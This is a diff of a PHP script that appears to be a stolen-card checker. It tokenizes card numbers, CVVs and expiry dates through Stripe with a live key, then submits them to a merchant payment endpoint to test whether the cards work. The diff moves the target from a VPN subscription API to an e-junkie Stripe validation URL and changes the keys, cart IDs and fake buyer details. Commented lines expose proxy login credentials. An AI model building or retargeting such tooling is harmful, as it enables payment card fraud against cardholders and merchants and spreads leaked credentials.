@@ -191,7 +191,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F539dba3af%3B+stripe-js-v3%2F539dba3af&time_on_page=67953&key=pk_live_51JqxTMFjzs9C6LJIBllCeFHO0pUYRCwD92ErnuHKkrbxfizllbEz0thXMBkn0aaueRp3VQNmIEowY0OviLzhrYX400dqfWYQbv');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F539dba3af%3B+stripe-js-v3%2F539dba3af&time_on_page=67953&key=pk_live_UUFYTQ63roIxScFWo9jLfco5&_stripe_account=acct_1BxIUBKG4iYafRve');
 $result1 = curl_exec($ch);
 $token = trim(strip_tags(getStr($result1,'"id": "','"')));
 
@@ -201,7 +201,7 @@ echo $token;
 //curl_setopt($ch, CURLOPT_PROXY, $p);
 //curl_setopt($curl, CURLOPT_PROXY, 'http://zproxy.lum-superproxy.io:22225');
 //curl_setopt($curl, CURLOPT_PROXYUSERPWD, 'lum-customer-hl_dc379a83-zone-data_center:3yvhp78xnm7w');
- curl_setopt($ch, CURLOPT_URL, 'https://web-api.vpns.robovpn.com/api/users/subscriptions/subscribe');
+ curl_setopt($ch, CURLOPT_URL, 'https://www.e-junkie.com/ecom/ccv3/assets-php/Stripe/stripeValidate.php');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -219,7 +219,7 @@ echo $token;
    'user-agent: Mozilla/5.0 (Linux; Android 10; SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36',
    'sec-fetch-mode: cors',
 ));
- curl_setopt($ch, CURLOPT_POSTFIELDS, '{"payment_token":"'.$token.'","plan":"Monthly","email":"'.$email.'","method":"Stripe","first_name":"Rayan","last_name":"Bryan","postal_code":"10080"}');
+ curl_setopt($ch, CURLOPT_POSTFIELDS, '{"payment_method_id":"'.$token.'","cart_id":"160271797","cart_md5":"9bcbf74796a82cce2e042c74f4da37ce","first_name":"Jacob","last_name":"brayan","email":"dcmarveltg@gmail.com"}');
 $result = curl_exec($ch);
 
 echo $token;
